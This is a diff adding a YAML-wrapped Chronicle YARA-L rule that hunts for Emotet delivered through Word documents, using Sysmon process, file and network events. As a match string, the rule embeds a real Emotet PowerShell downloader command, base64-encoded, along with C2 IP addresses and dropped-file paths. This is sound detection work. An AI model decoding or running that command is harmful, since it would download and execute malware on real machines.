@@ -1,0 +1,75 @@
+id: chronicle-detection-rules-emotet-through-word-document-sysmon-behavior
+name: emotet_through_word_document_sysmon_behavior
+description: emotet_through_word_document_sysmon_behavior
+severity: medium
+enabled: false
+tags:
+  mitre: []
+  categories:
+  - endpoint
+references: []
+logsource:
+  product: chronicle
+detection:
+  chronicle_yaral: "rule emotet_through_word_document_sysmon_behavior {\n meta:\n\
+    \    author = \"Lee Archinal\"\n    description = \"This content detects a sample\
+    \ of Emotet dropped through a Microsoft Word document. July saw an increase in\
+    \ Emotet attacks and samples  License: https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md.\"\
+    \n    reference = \"https://tdm.socprime.com/tdm/info/2tYN2TlMxm0a\"\n    version\
+    \ = \"0.01\"\n    created = \"2020/07/20\"\n    product = \"windows\"\n    service\
+    \ = \"sysmon\"\n    mitre = \"defense_evasion, execution, command_and_control,\
+    \ t1059.001, t1070.004, t1071.001\"\n\n  events:\n((((((((((((($selection1.metadata.product_event_type\
+    \ = \"1\" and $selection1.target.process.file.full_path = \"C:\\\\Windows\\\\\
+    System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\" and $selection1.target.process.command_line\
+    \ = \"powersheLL -e JAB6AGUAaQB0AG0AZQBpAHEAdQBzAGkAeABoAGEAaAA9ACcAeQBhAHcAcQB1AGkAbwBwAHQAbwBhAHkAdgBvAGkAawBrAG8AZQB6AGcAYQBlAHgAJwA7AFsATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6ACIAUwBgAGUAYABjAGAAVQBSAGkAVABgAHkAUAByAGAATwB0AG8AQwBvAGwAIgAgAD0AIAAnAHQAbABzADEAMgAsACAAdABsAHMAMQAxACwAIAB0AGwAcwAnADsAJAB0AGgAdQBhAHQAIAA9ACAAJwAxADMANwAnADsAJABzAGkAZQBxAHUAPQAnAHIAdQB1AG4AYwBoAG8AbwBkAHIAdQBhAGMAegBvAGUAeQAnADsAJABiAHUAbQBjAGgAbwB1AG4AaABhAG8AZgBjAGkAdgBzAG8AdQBtAD0AJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQArACcAXAAnACsAJAB0AGgAdQBhAHQAKwAnAC4AZQB4AGUAJwA7ACQAdwBhAGcAbQB1AHUAdABoAGIAbwBpAHkAZABvAGcAdwBvAHUAcgBuAG8AdQB2AD0AJwB5AGUAaQBmAGIAdQBzACcAOwAkAGsAYQBmAHMAbwBpAGgAdABoAGEAbwBuAHIAYQB1AHcAcgB1AGEAagBwAG8AbwBuAD0ALgAoACcAbgBlACcAKwAnAHcALQBvAGIAagBlACcAKwAnAGMAJwArACcAdAAnACkAIABOAGUAdAAuAHcAZQBiAGMATABpAEUATgB0ADsAJABsAG8AYQBiAHQAaABlAG4AZgBpAGUAYgA9ACcAaAB0AHQAcAA6AC8ALwBhAHIAeQBhAGUAbgB0AGUAcgBwAHIAaQBzAGUAcwByAGIAbAAuAGMAbwBtAC8AdwBwAC0AYQBkAG0AaQBuAC8AdQBKADcAMgA3ADUAMwAyAC8AKgBoAHQAdABwADoALwAvAHcAdwB3AC4AbwBhAGsAZQBuAG8ALgBjAG8AbQAvAHcAcAAtAGEAZABtAGkAbgAvAHQAdgB5AFAATwAvACoAaAB0AHQAcABzADoALwAvAGMAaABhAHQAZgBsAGEAaQByAC4AYwBvAG0ALwBnAGUAbgBlAHIAYQBsAGwALwBQAEYAMABkAC8AKgBoAHQAdABwADoALwAvAGUAbQBhAHIAYwBsAG8AZgBpAHQAbgBlAHMAcwBhAGMAYQBkAGUAbQB5AC4AYwBvAG0ALwB4AGwAbgB3AGsALwBmAGQASgBJADMAMgA2ADIAMgAvACoAaAB0AHQAcAA6AC8ALwBkAHUAbwBjAGwAaQBlAHUAMgA0ADcALgBjAG8AbQAvAHcAcAAtAGMAbwBuAHQAZQBuAHQALwAzADQALwAnAC4AIgBzAHAATABgAGkAVAAiACgAWwBjAGgAYQByAF0ANAAyACkAOwAkAHMAYQBpAHcAeABlAGkAcgBxAHUAdQB1AHAAZwBlAHUAdwB0AG8AYQBxAHUAPQAnAHgAbwB1AGsAdwBpAGcAcQB1AGUAaQBmAGcAZQBvAHEAdQBtAGUAbwBiACcAOwBmAG8AcgBlAGEAYwBoACgAJABtAGkAZQBtAGQAdQBhAGQAeQBvAHUAbgBxAHUAYQB1AHgAdABhAGkAdgBjAGEAZQBoACAAaQBuACAAJABsAG8AYQBiAHQAaABlAG4AZgBpAGUAYgApAHsAdAByAHkAewAkAGsAYQBmAHMAbwBpAGgAdABoAGEAbwBuAHIAYQB1AHcAcgB1AGEAagBwAG8AbwBuAC4AIgBkAE8AVwBgAE4AbABgAE8AYQBkAGYASQBMAEUAIgAoACQAbQBpAGUAbQBkAHUAYQBkAHkAbwB1AG4AcQB1AGEAdQB4AHQAYQBpAHYAYwBhAGUAaAAsACAAJABiAHUAbQBjAGgAbwB1AG4AaABhAG8AZgBjAGkAdgBzAG8AdQBtACkAOwAkAHoAdQBqAD0AJwBkAGEAdAB0AGEAZQB4AG0AZQBhAHQAaABnAGUAcAB6AG8AZQBtACcAOwBJAGYAIAAoACgALgAoACcARwBlAHQALQBJACcAKwAnAHQAJwArACcAZQBtACcAKQAgACQAYgB1AG0AYwBoAG8AdQBuAGgAYQBvAGYAYwBpAHYAcwBvAHUAbQApAC4AIgBsAGUAYABOAEcAYABUAGgAIgAgAC0AZwBlACAAMwA5ADMANwAyACkAIAB7ACgAWwB3AG0AaQBjAGwAYQBzAHMAXQAnAHcAaQBuADMAMgBfAFAAcgBvAGMAZQBzAHMAJwApAC4AIgBDAGAAUgBFAEEAVABFACIAKAAkAGIAdQBtAGMAaABvAHUAbgBoAGEAbwBmAGMAaQB2AHMAbwB1AG0AKQA7ACQAdABoAG8AbwB2AD0AJwBqAGEAZQBzAGoAYQBxAHUAcgB1AHUAZgAnADsAYgByAGUAYQBrADsAJAB0AGgAZQBlAG4AZwBpAGEAdwBqAGkAbwBwAGwAbwBpAHMAPQAnAHEAdQBvAGIAZABpAGUAZABjAGgAaQBxAHUAcABvAHUAbgAnAH0AfQBjAGEAdABjAGgAewB9AH0AJABuAGEAbwBzAGgAdQBuAGgAYQB1AGsAdABlAHQAZgBpAG8AeQBnAGEAdQBqAD0AJwB3AGkAZQB0AGYAYQB6AHQAaABvAG8AZwBtAG8AdQBjAGgAJwA=\"\
+    \ and $selection1.principal.process.file.full_path = \"C:\\\\Windows\\\\System32\\\
+    \\wbem\\\\WmiPrvSE.exe\") or ($selection1.metadata.product_event_type = \"11\"\
+    \ and $selection1.target.process.file.full_path = \"C:\\\\Windows\\\\System32\\\
+    \\WindowsPowerShell\\\\v1.0\\\\powersheLL.exe\" and re.regex($selection1.target.registry.registry_key,\
+    \ `.*\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest.*\\.ps1`))) or ($selection1.metadata.product_event_type\
+    \ = \"23\" and $selection1.target.process.file.full_path = \"C:\\\\Windows\\\\\
+    System32\\\\WindowsPowerShell\\\\v1.0\\\\powersheLL.exe\" and re.regex($selection1.target.registry.registry_key,\
+    \ `.*\\\\AppData\\\\Local\\\\Temp\\\\__PSScriptPolicyTest.*\\.ps1`))) or ($selection1.metadata.product_event_type\
+    \ = \"11\" and $selection1.target.process.file.full_path = \"C:\\\\Windows\\\\\
+    System32\\\\WindowsPowerShell\\\\v1.0\\\\powersheLL.exe\" and re.regex($selection1.target.file.full_path,\
+    \ `C:\\\\Users.*\\.exe`))) or ($selection1.metadata.product_event_type = \"3\"\
+    \ and $selection1.target.process.file.full_path = \"C:\\\\Windows\\\\System32\\\
+    \\WindowsPowerShell\\\\v1.0\\\\powershell.exe\" and $selection1.target.ip = \"\
+    50.62.168.3\")) or ($selection1.metadata.product_event_type = \"11\" and re.regex($selection1.target.process.file.full_path,\
+    \ `C:\\\\Users.*\\.exe`) and re.regex($selection1.target.file.full_path, `.*\\\
+    \\AppData\\\\Local.*`))) or ($selection1.metadata.product_event_type = \"1\" and\
+    \ re.regex($selection1.target.process.file.full_path, `.*\\\\AppData\\\\Local\\\
+    \\NlsData0009\\\\url\\.exe`))) or ($selection1.metadata.product_event_type = \"\
+    3\" and re.regex($selection1.target.process.file.full_path, `.*\\\\AppData\\\\\
+    Local\\\\NlsData0009\\\\url\\.exe`) and $selection1.target.ip = \"181.30.69.50\"\
+    )) or ($selection1.metadata.product_event_type = \"11\" and re.regex($selection1.target.process.file.full_path,\
+    \ `.*\\\\AppData\\\\Local\\\\NlsData0009\\\\url\\.exe`) and re.regex($selection1.target.file.full_path,\
+    \ `.*\\\\AppData\\\\Local\\\\NlsData0009\\\\KBDYBAa52\\.exe`))) or ($selection1.metadata.product_event_type\
+    \ = \"1\" and re.regex($selection1.target.process.file.full_path, `.*\\\\AppData\\\
+    \\Local\\\\NlsData0009\\\\KBDYBAa52\\.exe`) and re.regex($selection1.target.process.command_line,\
+    \ `.*zAMAACAAAABOAGwAcwBEAGEAdABhADAAMAAwADkAXAB1AHIAbAAAAA==`))) or ($selection1.metadata.product_event_type\
+    \ = \"11\" and re.regex($selection1.target.process.file.full_path, `.*\\\\AppData\\\
+    \\Local\\\\NlsData0009\\\\url\\.exe`) and re.regex($selection1.target.file.full_path,\
+    \ `.*\\\\AppData\\\\Local\\\\NlsData0009\\\\AppointmentActivationa69\\.exe`)))\
+    \ or ($selection1.metadata.product_event_type = \"1\" and $selection1.target.process.file.full_path\
+    \ = \"C:\\\\Windows\\\\SysWOW64\\\\cmd.exe\" and re.regex($selection1.target.process.command_line,\
+    \ `C:\\\\Windows\\\\System32\\\\cmd\\.exe  /c ping\\.exe -n 6 127\\.0\\.0\\.1\
+    \ &  type C:\\\\Windows\\\\System32\\\\calc\\.exe > .*\\\\AppData\\\\Local\\\\\
+    NlsData0009\\\\AppointmentActivationa69\\.exe`) and re.regex($selection1.principal.process.file.full_path,\
+    \ `.*\\\\AppData\\\\Local\\\\NlsData0009\\\\AppointmentActivationa69\\.exe`)))\
+    \ or ($selection1.metadata.product_event_type = \"1\" and $selection1.target.process.file.full_path\
+    \ = \"C:\\\\Windows\\\\SysWOW64\\\\PING.EXE\" and $selection1.target.process.command_line\
+    \ = \"ping.exe  -n 6 127.0.0.1\"))\n\n  condition:\n    $selection1\n}"
+  chronicle_rule_name: emotet_through_word_document_sysmon_behavior
+provenance:
+  source: chronicle/detection-rules
+  source_id: emotet_through_word_document_sysmon_behavior
+  source_commit: 74dd490
+  license: Apache-2.0
+  license_url: https://github.com/chronicle/detection-rules/blob/main/LICENSE
+  imported_at: '2026-05-04'
+  imported_by: chronicle_importer
+  upstream_path: rules/_deprecated/soc_prime_rules/threat_hunting/sysmon/emotet_through_word_document__sysmon_behavior.yaral
+notes:
+  chronicle_meta: {}
+  quarantine_reason: raw YARA-L — needs translation to AiSOC schema
